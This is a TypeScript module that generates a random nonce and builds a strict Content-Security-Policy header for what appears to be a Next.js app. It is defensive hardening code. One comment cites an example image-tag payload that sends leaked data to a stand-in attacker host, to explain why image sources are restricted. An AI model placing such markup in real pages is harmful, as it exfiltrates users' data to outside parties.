// Per-request Content-Security-Policy. Issued fresh on every HTML request
// via a one-time nonce so we can drop 'unsafe-inline' from script-src.

export function generateNonce(): string {
  // Base64-encoded 128-bit random. Buffer is available in the Node.js Proxy.
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return (typeof Buffer !== "undefined"
    ? Buffer.from(binary, "binary").toString("base64")
    : btoa(binary));
}

export interface BuildCspOptions {
  nonce: string;
  isDev?: boolean;
}

/**
 * Build the CSP header value. `'strict-dynamic'` lets scripts loaded by
 * our nonced bootstrap further load additional scripts without every
 * dependency needing its own nonce — this is the only ergonomic way to
 * run Next.js App Router without `'unsafe-inline'`.
 *
 * In dev we add `'unsafe-eval'` because React fast-refresh relies on it.
 */
export function buildCsp({ nonce, isDev = false }: BuildCspOptions): string {
  const scriptSrc = [
    "'self'",
    `'nonce-${nonce}'`,
    "'strict-dynamic'",
    isDev ? "'unsafe-eval'" : null,
  ]
    .filter(Boolean)
    .join(" ");

  const directives = [
    "default-src 'self'",
    `script-src ${scriptSrc}`,
    // Tailwind + Next.js ship small inline style fragments for route
    // transitions and theme vars. Keep 'unsafe-inline' on styles for now;
    // the XSS risk from style injection is substantially lower than script
    // injection.
    "style-src 'self' 'unsafe-inline'",
    // Google avatar CDN is the only cross-origin image source we actually
    // load. Dropping the open `https:` source closes an easy exfiltration
    // channel (e.g. `<img src=https://attacker.example/?leak=…>`).
    "img-src 'self' data: https://lh3.googleusercontent.com",
    "font-src 'self'",
    "connect-src 'self' https://accounts.google.com",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests",
  ];

  return directives.join("; ");
}
